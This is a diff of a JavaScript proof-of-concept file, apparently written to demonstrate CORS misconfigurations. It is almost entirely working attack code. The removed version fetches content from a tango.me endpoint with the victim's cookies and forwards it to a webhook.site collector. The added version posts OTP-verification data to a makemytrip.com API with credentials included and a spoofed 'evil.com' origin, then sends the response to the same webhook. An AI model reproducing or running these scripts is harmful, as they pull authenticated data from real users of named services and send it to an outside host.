@@ -1,22 +1,47 @@
-<script>
-  fetch('https://gateway.tango.me/securecontent/RyVCwhlwzKIhFpygdY0nNFoa3U9I6JPQtqnxPCkasXu7XcuTWO1Bl0BhnQyHacRdJg_BcDTc100ft72aXz-ZX-1ctg3c96a5LB0Pfkg0BjQ', {
-    method: 'GET',
-    credentials: 'include',
-    mode: 'no-cors'// Necessary to include cookies in the request
-  })
-  .then(response => response.blob()) // Assuming the content is not purely text
-  .then(blob => {
-    const reader = new FileReader();
-    reader.onload = function() {
-      fetch('https://webhook.site/84296d9c-f7fd-4f43-b7b4-2f7e894caec5', {
+
+
+// URL of the targeted site
+const targetUrl = 'https://mapi.makemytrip.com/ext/web/pwa/verify/token/SIGNUP_OTP?region=us&currency=USD&language=eng';
+
+// Data you want to POST
+const postData = {
+    type: 6,
+    token: "100017",
+    mobileNumber: "56186761",
+    countryCode: "216"
+};
+
+// Your webhook URL
+const webhookUrl = 'https://webhook.site/84296d9c-f7fd-4f43-b7b4-2f7e894caec5';
+
+// Function to send data to the target and then to the webhook
+function sendDataToTargetThenWebhook() {
+    fetch(targetUrl, {
         method: 'POST',
+        credentials: 'include',
         headers: {
-          'Content-Type': 'application/json'
+            'Content-Type': 'application/json',
+            'Origin': 'https://evil.com' // The origin set to show CORS misconfiguration
         },
-        body: JSON.stringify({ data: this.result })  // Sending the data as JSON
-      });
-    };
-    reader.readAsText(blob);  // Read the response as text
-  })
-  .catch(error => console.error('Error:', error));
-</script>
+        body: JSON.stringify(postData)
+    })
+    .then(response => response.json()) // Processing the response as JSON
+    .then(data => {
+        console.log('Received response:', data);
+        // Forwarding received data to the webhook
+        return fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data) // Sending received data to the webhook
+        });
+    })
+    .then(response => response.text()) // Processing the second response as text
+    .then(result => console.log('Webhook response:', result))
+    .catch(error => console.error('Error:', error));
+}
+
+// Call the function to execute
+sendDataToTargetThenWebhook();
+
